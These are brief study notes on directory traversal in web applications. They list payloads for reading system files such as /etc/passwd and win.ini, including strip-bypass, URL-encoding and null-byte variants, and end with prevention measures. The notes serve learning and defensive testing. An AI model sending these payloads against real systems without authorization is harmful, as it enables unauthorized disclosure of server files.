Directory Traversal

  • We can use user controllable parameters to traverse unintended files

Finding Directory Traversal:

White box:

Black box:

  • Map the Application
  • Use payloads to test for DT

Exploitation:

regular:

../../../../../etc/passwd
../../../../../windows/win.ini

Absolute paths:

/etc/passwd

Traversal sequences stripped non-recursively:

....//....//...//etc/passwd

URL Encoding, Double URL encoding:

#requires specific starting path
/var/www/images/../../../../etc/passwd

Bypass file extension validation via null byte:

#requires .png
#only works with certain frameworks/configurations
../../../etc/passwd%00.png
..%2ffile

Prevention:

  • avoid passing user supplied input to filesystem APIs
  • Validate user input by comparing it to an allow list
  • utilize file id or file path referencing
  • Utilize filesystem API to canonicalize the path and verify is starts with the expected base directory
